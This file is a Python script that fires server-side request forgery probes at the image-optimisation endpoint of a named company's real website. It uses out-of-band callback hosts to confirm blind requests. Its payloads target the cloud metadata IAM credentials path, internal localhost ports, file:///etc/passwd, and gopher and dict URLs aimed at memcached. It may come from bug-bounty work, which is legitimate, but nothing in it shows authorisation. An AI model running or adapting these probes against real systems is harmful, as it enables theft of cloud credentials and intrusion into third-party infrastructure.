import requests, hashlib, time, urllib.parse
UA='Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36'
H={'User-Agent':UA}
B='https://www.infinitycapital.bh/_next/image'
H1='oobf1f8b7d91a7d.dau2p4ghgqag02k5emggc5xu6hph3m973.oast.abhedi.co.in'
H2='oobda67832edf58.dau2p4ghgqag02k5emggc5xu6hph3m973.oast.abhedi.co.in'
CTF='https://images.ctfassets.net/yts1dx0j7jj5/1GCT0vyjqmOwm2OL1YVpD1/2ab55f8b5189afa153eac5cb97f7f6d4/Ahmed_Taleb_updated-min.jpg'
tests=[
 ("baseline-ctf", CTF),
 ("oob-http-1", "http://"+H1+"/ssrf1.png"),
 ("oob-http-2", "http://"+H1+"/a/b/c/ssrf2"),
 ("oob-dns-1", "http://"+H2+"/x.png"),
 ("metadata-iam", "http://169.254.169.254/latest/meta-data/iam/security-credentials/"),
 ("metadata-raw", "http://169.254.169.254/latest/meta-data/"),
 ("localhost-80", "http://127.0.0.1:80/"),
 ("localhost-3000", "http://127.0.0.1:3000/"),
 ("localhost-8080", "http://127.0.0.1:8080/"),
 ("local-v6", "http://[::1]:3000/"),
 ("file-proto", "file:///etc/passwd"),
 ("gopher", "gopher://127.0.0.1:11211/_stats"),
 ("dict", "dict://127.0.0.1:11211/stats"),
 ("google-redirect", "https://www.google.com/"),
]
for name,u in tests:
    q=urllib.parse.urlencode({'url':u,'w':'640','q':'75'})
    t=time.time()
    try:
        r=requests.get(B+'?'+q, headers=H, timeout=40)
        el=time.time()-t
        body=r.content[:120]
        print(f"{name:18s} {r.status_code} len={len(r.content)} ct={r.headers.get('content-type','')[:30]} t={el:.1f} :: {body!r}", flush=True)
    except Exception as e:
        print(f"{name:18s} ERR {time.time()-t:.1f} {e}", flush=True)
    time.sleep(2)
